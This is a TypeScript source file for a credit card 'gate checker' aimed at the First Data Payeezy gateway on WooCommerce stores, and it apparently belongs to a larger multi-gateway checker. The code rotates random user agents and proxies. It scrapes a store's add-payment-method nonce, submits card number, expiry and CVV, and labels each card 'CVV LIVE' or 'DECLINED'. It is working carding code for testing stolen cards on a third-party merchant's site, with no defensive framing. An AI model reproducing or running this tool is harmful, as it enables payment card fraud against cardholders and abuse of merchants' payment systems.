/**
 * First Data Payeezy WooCommerce gate checker.
 *
 * Reconstructed from reference implementation: Payezzy Auth.py (flavanaturals.com).
 * No external tokenization API — card fields are POSTed directly to the WC
 * add-payment-method endpoint using the `first_data_payeezy_gateway_credit_card`
 * payment method.
 */
import {
  pick,
  extractBetween,
  sessionFetch,
  getProxy,
  dbg,
  detectBrandFromBin,
  type CheckResult,
  type SessionState,
} from "./stripe-checker";
import { generateRandom } from "./ua-generator";

export async function checkCardPayeezy(
  cardNumber: string,
  expMonth: string,
  expYear: string,
  cvv: string,
  gateName: string,
  siteUrl: string,
  addPmPath?: string,
): Promise<CheckResult> {
  const start = Date.now();
  const uaProfile = generateRandom();
  const ua = uaProfile.ua;
  const secChUa = uaProfile.secChUa;

  let month = expMonth.trim().padStart(2, "0");
  let year = expYear.trim();
  if (year.length === 4) year = year.slice(-2);
  const fullCardInfo = `${cardNumber.trim()}|${month}|${year}|${cvv.trim()}`;
  const cleanSite = siteUrl.replace(/\/+$/, "");
  const network = detectBrandFromBin(cardNumber);

  try {
    let state: SessionState = { ua, secChUa, cookies: "", proxy: (await getProxy()) ?? undefined };

    const addPmUrl = `${cleanSite}${addPmPath || "/my-account/add-payment-method/"}`;
    const pageResp = await sessionFetch(addPmUrl, state, { timeout: 15000 });
    state = pageResp.state;

    const nonce = extractBetween(pageResp.text, 'name="woocommerce-add-payment-method-nonce" value="', '"')
      || extractBetween(pageResp.text, '"woocommerce-add-payment-method-nonce":"', '"');

    if (!nonce) {
      return {
        status: "error",
        response: "No add-payment-method nonce found (login may be required)",
        code: "no_nonce",
        latency: Date.now() - start,
        gate: gateName,
        cardInfo: fullCardInfo,
      };
    }

    const form = new URLSearchParams({
      payment_method: "first_data_payeezy_gateway_credit_card",
      "wc-first-data-payeezy-gateway-credit-card-context": "shortcode",
      "wc-first-data-payeezy-gateway-credit-card-account-number": cardNumber.trim(),
      "wc-first-data-payeezy-gateway-credit-card-expiry": `${month} / ${year}`,
      "wc-first-data-payeezy-gateway-credit-card-csc": cvv.trim(),
      "wc-first-data-payeezy-gateway-credit-card-tokenize-payment-method": "true",
      "woocommerce-add-payment-method-nonce": nonce,
      _wp_http_referer: "/my-account/add-payment-method/",
      woocommerce_add_payment_method: "1",
    });

    const submitResp = await sessionFetch(addPmUrl, state, {
      method: "POST",
      body: form.toString(),
      contentType: "application/x-www-form-urlencoded",
      referer: addPmUrl,
      origin: cleanSite,
      timeout: 30000,
    });

    const html = submitResp.text;
    const lower = html.toLowerCase();

    if (
      lower.includes("nice! new payment method added") ||
      lower.includes("payment method successfully added")
    ) {
      return {
        status: "live",
        response: `CVV LIVE ✓ Payeezy Approved | ${network}`,
        code: "payeezy_approved",
        latency: Date.now() - start,
        gate: gateName,
        cardInfo: fullCardInfo,
      };
    }

    const errLiM = html.match(/<li[^>]*>([\s\S]*?)<\/li>/i);
    const errMsg = errLiM?.[1]?.replace(/<[^>]+>/g, " ").replace(/\s+/g, " ").trim() || "Declined";

    dbg(`[payeezy] ${gateName}: response len=${html.length}, msg="${errMsg.substring(0, 80)}"`);

    return {
      status: "dead",
      response: `DECLINED ✗ ${errMsg} | ${network}`,
      code: "payeezy_declined",
      latency: Date.now() - start,
      gate: gateName,
      cardInfo: fullCardInfo,
    };
  } catch (error: any) {
    return {
      status: "error",
      response: `Payeezy Error: ${error.message}`,
      code: "network_error",
      latency: Date.now() - start,
      gate: gateName,
      cardInfo: fullCardInfo,
    };
  }
}
